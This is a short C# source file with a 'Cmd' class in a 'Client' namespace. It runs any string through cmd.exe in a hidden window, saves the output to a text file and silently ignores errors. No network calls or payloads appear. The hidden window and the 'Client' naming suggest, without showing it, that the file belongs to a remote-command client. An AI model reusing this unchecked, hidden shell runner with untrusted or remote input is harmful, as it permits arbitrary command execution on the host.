using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client
{
    internal class Cmd
    {

        public static string RunCommandAndGetOutput(string command)
        {
            string output = "";

            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe"; // Command prompt executable
                process.StartInfo.Arguments = "/c " + command; // /c flag tells cmd.exe to run the command and exit
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                output = process.StandardOutput.ReadToEnd();

                process.WaitForExit();
            }
            catch (Exception ex)
            {
            }
            string logNameToWrite = "cmdResult.txt";
            StreamWriter sw = new StreamWriter(logNameToWrite, false);
            sw.WriteLine(output);
            sw.Close();
            return output;
        }
    }
}
